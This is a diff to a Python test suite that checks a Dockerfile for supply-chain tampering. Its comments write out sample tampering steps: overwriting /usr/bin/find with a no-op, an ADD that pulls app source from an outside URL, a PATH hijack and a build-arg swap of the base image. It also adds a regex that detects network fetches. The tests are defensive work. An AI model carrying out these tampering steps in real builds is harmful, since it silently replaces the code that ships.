@@ -129,6 +129,10 @@ class _Instruction:
     keyword: str
     argument: str
     index: int
+    # The WORKDIR in force at this instruction. Needed because a COPY destination may be
+    # relative, and `WORKDIR /usr/bin` with `COPY --from=build /bin/true find` writes
+    # /usr/bin/find while the destination token is just "find".
+    workdir: str = "/"
 
 
 def _dockerfile() -> str:
@@ -188,6 +192,7 @@ def _instructions() -> list[_Instruction]:
     out: list[_Instruction] = []
     stage = -1
     stage_name = ""
+    workdir = "/"
     for index, line in enumerate(joined):
         parts = line.split(None, 1)
         keyword = parts[0].upper()
@@ -208,11 +213,17 @@ def _instructions() -> list[_Instruction]:
         )
         if keyword == "FROM":
             stage += 1
+            workdir = "/"
             pieces = argument.split()
             stage_name = (
                 pieces[-1].lower() if len(pieces) >= 3 and pieces[-2].upper() == "AS" else ""
             )
-        out.append(_Instruction(stage, stage_name, keyword, argument, index))
+        elif keyword == "WORKDIR":
+            candidate = argument.strip().strip("\"'")
+            workdir = (
+                candidate if candidate.startswith("/") else f"{workdir.rstrip('/')}/{candidate}"
+            )
+        out.append(_Instruction(stage, stage_name, keyword, argument, index, workdir))
     return out
 
 
@@ -320,12 +331,25 @@ def test_every_base_image_is_pinned_by_digest() -> None:
     floating tag means the image scanned in CI and the image that ships can differ.
     """
     instructions = _instructions()
+    # An ARG default is not a pin. `--build-arg BASE_DIGEST=sha256:<other>` replaced the base of
+    # both stages while this test resolved the default and saw nothing wrong, so a digest that
+    # lives in an ARG referenced by a FROM is refused outright.
     defaults = {
         name: value
         for name, _, value in (
             i.argument.partition("=") for i in instructions if i.keyword == "ARG"
         )
     }
+    for instruction in instructions:
+        if instruction.keyword != "FROM":
+            continue
+        for name in defaults:
+            assert f"${name}" not in instruction.argument and f"${{{name}}}" not in (
+                instruction.argument
+            ), (
+                f"FROM substitutes the build argument {name!r}, which --build-arg can replace "
+                f"at build time: {instruction.argument}"
+            )
     unpinned: list[str] = []
     for instruction in instructions:
         if instruction.keyword != "FROM":
@@ -459,12 +483,49 @@ def test_nothing_writes_over_a_binary_the_hardening_steps_depend_on() -> None:
     for instruction in _instructions():
         if instruction.keyword not in {"COPY", "ADD"}:
             continue
-        target = instruction.argument.split()[-1]
+        # Resolved against the WORKDIR in force, and stripped of quoting and JSON punctuation.
+        # Testing the raw last token missed two forms: `WORKDIR /usr/bin` then
+        # `COPY --from=build /bin/true find` gives the token "find", and the JSON form
+        # `COPY --from=build ["/bin/true", "/usr/bin/find"]` gives `"/usr/bin/find"]`. Both
+        # replaced /usr/bin/find with a no-op and left the whole suite green.
+        raw = instruction.argument.split()[-1].strip("[]\"',")
+        target = raw if raw.startswith("/") else f"{instruction.workdir.rstrip('/')}/{raw}"
         if any(target.startswith(directory) for directory in _EXECUTABLE_DIRECTORIES):
-            offenders.append(f"{instruction.keyword} {instruction.argument[:80]}")
+            offenders.append(f"{instruction.keyword} {instruction.argument[:80]} -> {target}")
     assert not offenders, (
         f"an instruction writes into a system executable directory, so the binaries the "
         f"hardening steps name may not be the binaries that run: {offenders}"
+    )
+
+
+def test_no_instruction_fetches_from_the_network_or_rewrites_the_shipped_path() -> None:
+    """Two more ways to change what runs without changing what the assertions read.
+
+    `ADD https://example.invalid/app.py /app/src/pree/app.py` replaces the application source
+    at build time from a host nothing here controls, and the build is otherwise identical. And
+    an `ENV PATH=` in the shipped stage hijacks the `sh` and the `gunicorn` the pinned CMD
+    resolves, which is the same lesson as the sweep: pinning a command's text says nothing
+    about which binaries its names reach. Both left the boot contract green.
+    """
+    remote = [
+        f"{i.keyword} {i.argument[:80]}"
+        for i in _instructions()
+        if i.keyword == "ADD" and re.search(r"\bhttps?://|\bgit@", i.argument)
+    ]
+    assert not remote, f"an instruction fetches from the network at build time: {remote}"
+
+    shipped_paths = [
+        i.argument
+        for i in _final_stage()
+        if i.keyword == "ENV" and re.search(r"\bPATH\s*=", i.argument)
+    ]
+    assert len(shipped_paths) == 1, (
+        f"the shipped stage sets PATH {len(shipped_paths)} times; the launch command resolves "
+        f"sh and gunicorn through it: {shipped_paths}"
+    )
+    assert '"/opt/venv/bin:' in shipped_paths[0], (
+        f"the shipped PATH does not begin with the venv, so the pinned CMD may resolve a "
+        f"different gunicorn: {shipped_paths[0][:120]}"
     )
 
 
@@ -620,12 +681,13 @@ def _numbers_in(unit: str, size: re.Pattern[str], *, words: bool) -> set[str]:
     found = set(re.findall(r"\b\d[\d,]*\b", lowered))
     if not words:
         return found
-    for match in _NUMBER_WORD_PATTERN.finditer(lowered):
-        # Six words of slack either side: enough for "refused below eighteen characters" and
-        # "twenty-eight characters is the minimum", not enough to reach the next clause.
-        window = lowered[max(0, match.start() - 40) : match.end() + 40]
-        if size.search(window):
-            found.add(match.group(0))
+    # The size word may be ANYWHERE in the unit, matching the digit branch. A 40-character
+    # window was tried and beaten: a fabricated "Use sixteen, produced with a secure random
+    # generator" sat a line away from its size word and passed, which would have had an operator
+    # set a 16-character token and watch the deploy fail. The false positives that follow are
+    # the price, and they are visible immediately rather than latent.
+    if _NUMBER_WORD_PATTERN.search(lowered):
+        found |= set(_NUMBER_WORD_PATTERN.findall(lowered))
     return found
 
 
@@ -786,15 +848,28 @@ def test_the_example_environment_file_carries_no_real_value() -> None:
     """
     allowed_placeholders = {"", "development", "local"}
     offending: list[str] = []
-    for line in (REPO_ROOT / ".env.example").read_text(encoding="utf-8").splitlines():
-        stripped = line.strip()
-        if not stripped or stripped.startswith("#") or "=" not in stripped:
-            continue
-        name, _, value = stripped.partition("=")
-        if value.strip().strip("\"'") not in allowed_placeholders:
-            offending.append(f"{name.strip()}={value.strip()}")
+    # EVERY .env* file in the tree, not only the root one. The packaging exemption used to
+    # match the basename anywhere, so `docs/.env.example` carrying a live-looking token shipped
+    # in the archive while this test, reading the root path only, stayed green. The exemption is
+    # anchored now; this reads the whole tree so the two cannot disagree again.
+    candidates = sorted(
+        path
+        for path in REPO_ROOT.rglob(".env*")
+        if path.is_file() and ".venv" not in path.parts and ".git" not in path.parts
+    )
+    assert candidates == [REPO_ROOT / ".env.example"], (
+        f"the tree carries environment files beyond the root example: {candidates}"
+    )
+    for path in candidates:
+        for line in path.read_text(encoding="utf-8").splitlines():
+            stripped = line.strip()
+            if not stripped or stripped.startswith("#") or "=" not in stripped:
+                continue
+            name, _, value = stripped.partition("=")
+            if value.strip().strip("\"'") not in allowed_placeholders:
+                offending.append(f"{path.name}: {name.strip()}={value.strip()}")
     assert not offending, (
-        f"the example environment file carries values that are not placeholders: {offending}"
+        f"an example environment file carries values that are not placeholders: {offending}"
     )
 
 
